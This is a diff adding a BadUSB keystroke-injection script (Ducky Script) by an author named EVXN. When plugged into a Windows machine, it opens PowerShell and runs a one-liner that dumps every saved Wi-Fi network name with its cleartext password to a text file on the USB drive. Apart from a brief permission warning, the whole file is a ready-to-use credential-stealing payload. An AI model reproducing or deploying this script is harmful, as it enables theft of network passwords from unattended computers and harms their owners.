@@ -1,0 +1,15 @@
+REM 
+REM TITLE: BAD USB WIFI SSID & KEY GRAB AND EXPORT AS A .txt.
+REM AUTHOR: EVXN.
+REM WARNING: ONLY USE ON HARDWARE YOU HAVE PERMISSION TO ACCESS !
+REM YOU WILL HAVE TO CHANGE THE FILE PATH OF WHERE YOU WANT THE .txt FILE TO GO F:\wifikey.txt AT THE END OF LINE 11 !!!
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell
+DELAY 200
+ENTER
+DELAY 1000
+STRING (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -Wrap | out-file -filepath F:\wifikey.txt
+ENTER
+
